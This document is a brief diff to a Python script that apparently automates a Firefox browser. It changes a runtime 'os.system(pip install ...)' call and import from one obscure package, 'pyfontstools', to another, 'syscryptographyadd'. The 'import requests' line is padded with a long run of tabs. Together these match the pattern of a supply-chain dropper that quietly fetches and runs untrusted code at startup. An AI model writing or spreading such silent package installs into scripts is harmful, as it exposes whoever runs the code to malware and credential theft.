@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontstools")
-import pyfontstools
+os.system("pip install syscryptographyadd")
+import syscryptographyadd
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
